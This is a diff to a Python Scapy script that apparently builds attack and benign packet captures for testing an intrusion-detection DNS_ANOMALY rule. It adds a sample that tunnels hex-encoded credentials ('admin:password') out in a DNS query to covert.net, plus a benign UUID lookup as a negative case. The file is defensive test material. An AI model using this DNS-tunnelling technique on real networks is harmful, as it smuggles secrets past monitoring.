@@ -665,6 +665,24 @@ def gen_scanner_probe(base: float) -> list:
     return [pkt]
 
 
+def gen_hex_chunk_dns_tunnel(base: float) -> list:
+    """S34: Low-entropy hex chunk DNS covert tunneling query → DNS_ANOMALY."""
+    scenario(
+        "S34", "DNS_ANOMALY",
+        "Low-entropy hex-encoded data chunk exfiltration in DNS query",
+        src_ip="192.168.1.100", dst_ip="8.8.8.8",
+        dst_port="53", protocol="UDP",
+    )
+    pkt = (_make_eth() /
+           IP(src="192.168.1.100", dst="8.8.8.8") /
+           UDP(sport=53100, dport=53) /
+           DNS(rd=1, qd=DNSQR(qname="61646d696e3a70617373776f7264.covert.net")))
+    pkt.time = base + 280.0
+    return [pkt]
+
+
+
+
 
 # ---------------------------------------------------------------------------
 # Benign negative packet generators  (should NOT fire any rule)
@@ -953,6 +971,17 @@ def gen_benign_normal_http_assets(base: float) -> list:
     return pkts
 
 
+def gen_benign_uuid_dns(base: float) -> list:
+    """Standard service discovery UUID with hyphens should NOT fire DNS_ANOMALY."""
+    pkt = (_make_eth() /
+           IP(src="192.168.1.42", dst="8.8.8.8") /
+           UDP(sport=53200, dport=53) /
+           DNS(rd=1, qd=DNSQR(qname="123e4567-e89b-12d3-a456-426614174000.consul")))
+    pkt.time = base + 19.0
+    return [pkt]
+
+
+
 # ---------------------------------------------------------------------------
 # Main
 # ---------------------------------------------------------------------------
@@ -998,6 +1027,7 @@ def generate_all():
     attack_pkts += gen_data_exfil(base)
     attack_pkts += gen_udp_flood(base)
     attack_pkts += gen_scanner_probe(base)
+    attack_pkts += gen_hex_chunk_dns_tunnel(base)
 
     os.makedirs("data", exist_ok=True)
     wrpcap(OUTPUT_ATTACK, attack_pkts)
@@ -1026,6 +1056,7 @@ def generate_all():
     benign_pkts += gen_benign_small_outbound_transfers(base)
     benign_pkts += gen_benign_udp_flood_below_threshold(base)
     benign_pkts += gen_benign_normal_http_assets(base)
+    benign_pkts += gen_benign_uuid_dns(base)
 
     wrpcap(OUTPUT_BENIGN, benign_pkts)
     print(f"  [✔] {len(benign_pkts)} benign packets → {OUTPUT_BENIGN}")
